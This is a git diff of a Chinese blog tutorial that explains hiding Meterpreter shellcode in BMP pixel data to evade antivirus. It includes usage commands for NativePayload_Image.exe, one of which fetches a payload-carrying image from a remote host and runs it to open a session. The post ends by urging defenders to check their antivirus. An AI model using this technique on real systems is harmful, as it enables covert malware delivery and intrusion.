@@ -57,7 +57,7 @@ Decimal == hex 112 == 70 255 == ff 10 == 0A 192 == C0 34 == 22 84 == 54 111 == 6
 
 正如你所看到的图片3，我们有每个像素对应的16进制、10进制和颜色
 
-![图片3](https://github.com/angyzh/angyzh.github.io/blob/master/images/rgb.png)
+![图片3](https://github.com/angyzh/angyzh.github.io/blob/master/images/rgb.png?raw=true)  
 图片3
 
 现在你可以理解怎么样做和改变bmp文件的哪个位置去创建一种注入方式
@@ -71,7 +71,7 @@ Decimal == hex 112 == 70 255 == ff 10 == 0A 192 == C0 34 == 22 84 == 54 111 == 6
 
 正如你所看到的图片4，我们有一个空白的700*2像素的bmp文件
 
-![图片4](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic4.png)
+![图片4](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic4.png?raw=true)  
 图片4
 
 你可以保存文件为(24-bit bitmap)颜色格式  
@@ -84,12 +84,12 @@ Decimal == hex 112 == 70 255 == ff 10 == 0A 192 == C0 34 == 22 84 == 54 111 == 6
  
  在图片5中,你可以看到bmp文件没有修改之前在hexexitor NEO中的样子
  
-![图片5](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic5.png)
+![图片5](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic5.png?raw=true)  
 图片5
 
 现在在图片6中你可以看到3个像素其中的有效载荷表示为“70FF0A" "C02254" "6F00BE”
 
-![图片6](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic6.png)
+![图片6](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic6.png?raw=true)  
 图片6
 
 你可以看到当我们把有效载荷注入到bmp文件中发生的变化
@@ -101,19 +101,19 @@ Decimal == hex 112 == 70 255 == ff 10 == 0A 192 == C0 34 == 22 84 == 54 111 == 6
 
 现在将你的有效载荷从“pay.txt”复制粘贴到bmp文件的偏移0x36的位置,像图片7和图片8
 
-![图片7](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic7.png)
+![图片7](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic7.png?raw=true)  
 图片7
 
 有效载荷以FC48开始，FFD5结束，图片8中高亮的绿色区域
 
-![图片8](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic8.png)
+![图片8](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic8.png?raw=true)  
 图片8
 
 现在保存文件
 
 下面的步骤类似于图片9，你有了一个注入Meterpreter有效载荷的bmp文件
 
-![图片9](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic9.png)
+![图片9](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic9.png?raw=true)  
 图片9
 
 正如你所看到的，我们有了一个拥有更多像素的bmp文件
@@ -125,7 +125,7 @@ Decimal == hex 112 == 70 255 == ff 10 == 0A 192 == C0 34 == 22 84 == 54 111 == 6
 510 / 3 = 170 Pixels  
 it means 0 …. 169 Pixels in MS Paint like picture 10.
 
-![图片10](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic10.png)
+![图片10](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic10.png?raw=true)  
 图片10
 
 之后你需要一些代码来读取bmp文件中的有效载荷
@@ -138,7 +138,7 @@ it means 0 …. 169 Pixels in MS Paint like picture 10.
 
 - **第一步**：如果你想知道使用NativePayload_Image.exe程序的用法，你可以不输入任何参数直接运行，如图片11：
 
-![图片11](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic11.png)
+![图片11](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic11.png?raw=true)  
 图片11
 
 使用我的代码，你可以使用此语法为本地BMP文件提供非常简单的Meterpreter会话。
@@ -150,7 +150,7 @@ it means 0 …. 169 Pixels in MS Paint like picture 10.
 注意：Meterpreter的有效载荷长度为510字节(通过msfvenom工具的"-f C" 或者 "-f num"参数)
 注意：bmp文件头的长度总是为54字节
 
-![图片12](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic12.png)
+![图片12](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic12.png?raw=true)  
 图片12
 
 如图12，我们有了一个meterpreter会话
@@ -165,12 +165,12 @@ it means 0 …. 169 Pixels in MS Paint like picture 10.
 注意：你应该改变的你有效载荷像图13一样
 注意：改变” 0xfc , 0x48 , 0x83 “ 为 “fc,48,83, ...”
 
-![图片13](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic13.png)
+![图片13](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic13.png?raw=true)  
 图片13
 
 现在，如图14，你可以创建一个新得bmp文件
 
-![图片14](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic14.png)
+![图片14](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic14.png?raw=true)  
 图片14
 
 用法如下：
@@ -180,14 +180,14 @@ it means 0 …. 169 Pixels in MS Paint like picture 10.
 **第三步**：注入Meterpreter有效载荷到已存在的bmp文件
 你需要一个bmp文件，如图15：
 
-![图片15](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic15.png)
+![图片15](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic15.png?raw=true)  
 图片15
 
 修改文件的用法如下：
 - NativePayload_Image.exe modify “Existfilename.bmp” [header_length] [Meterpreter_payload]
 - NativePayload_Image.exe modify “Existfilename.bmp”  54  fc,48,83,....
 
-![图片16](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic16.png)
+![图片16](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic16.png?raw=true)  
 图片16
 
 修改文件只有，放大到300%可以看到我们的有效载荷在下面的黑色背景,看下一个图片，修改的bmp文件
@@ -202,7 +202,7 @@ it means 0 …. 169 Pixels in MS Paint like picture 10.
 -  NativePayload_Image.exe url “Url” [Meterpreter_payload_Length] [Header_Length]
 - NativePayload_Image.exe url "https://192.168.59.2:8000/MyBMP_to_Modify.bmp"  510   54
 
-![图片17](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic17.png)
+![图片17](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic17.png?raw=true)  
 图片17
 
 最后，这个技术不是新的，但我认为目前没有人关心这个威胁，但这真的很危险。 我们应该特别检查我们的防病毒，因为它也可以在BMP文件中使用加密的有效载荷，然后对于大多数AV来说它真的不可检测。 或者有效载荷可以分块到多个BMP文件中，然后它比没有任何混淆更危险，我认为默认情况下，大多数AV不会实时扫描BMP扩展文件或文件系统手动扫描。 另外我不认为他们可以检测BMP文件中的这个有效载荷（应该逐个检查AV），如果有人使用这种技术进行渗出，意味着传输数据（不使用BMP文件中的后门有效载荷，但只是 在BMP文件中添加数据），那么我们可以做什么作为捍卫者，以及如何检测这种渗出方法？ （现在检查你的AV）
